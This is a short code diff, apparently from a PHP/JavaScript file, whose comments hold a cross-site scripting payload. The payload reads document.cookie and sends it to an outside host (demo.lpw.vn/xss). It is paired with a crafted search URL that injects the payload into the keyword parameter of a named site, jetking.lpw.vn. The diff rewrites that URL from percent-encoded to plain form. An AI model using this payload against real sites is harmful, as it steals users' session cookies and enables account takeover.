@@ -17,5 +17,5 @@ function logCurrentURL() {
 }
 logCurrentURL();
 // <script>var cookie = document.cookie; document.location =`https://demo.lpw.vn/xss/?cookie=${cookie}`</script>
-// https://jetking.lpw.vn/search.php?keyword=s%27%3E%3Cscript%3Evar%20cookie%20=%20document.cookie;%20document.location%20=`https://demo.lpw.vn/xss/?cookie=${cookie}`%3C/script%3E
+// https://jetking.lpw.vn/search.php?keyword=s'><script>var cookie = document.cookie; document.location =`https://demo.lpw.vn/xss/?cookie=${cookie}`</script>
 ?>
